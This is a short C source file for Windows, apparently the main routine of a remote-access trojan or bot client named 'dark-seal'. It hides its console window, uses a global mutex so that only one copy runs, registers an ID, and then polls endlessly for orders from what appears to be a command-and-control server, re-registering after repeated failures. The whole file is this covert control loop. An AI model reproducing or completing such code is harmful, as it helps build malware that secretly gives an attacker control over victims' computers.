#include "headers.h"

int main(int argc, char **argv) {

	FreeConsole();

	HANDLE mutex = CreateMutex(NULL, TRUE, "Global\\dark-seal.mutex");
	int last_error = GetLastError();
	if (last_error == ERROR_ALREADY_EXISTS || last_error == ERROR_ACCESS_DENIED) {
		CloseHandle(mutex);
		exit(0);
	}

	char id[7] = {0};
	int timeout = 0;

	check_id(id);

	_delay = 2000;

	if (strcmp(id, "") == 0) {
		while (strcmp(id, "") == 0) {
			get_id(id);
			Sleep(_delay);
		}
	}
	else {
		re(id);
	}

	while(1) {
		if(get_order(id) != 0) {
			timeout++;
		}
		Sleep(_delay);
		if (timeout == 3) {
			re(id);
			timeout = 0;
		}
	}

	return 0;
}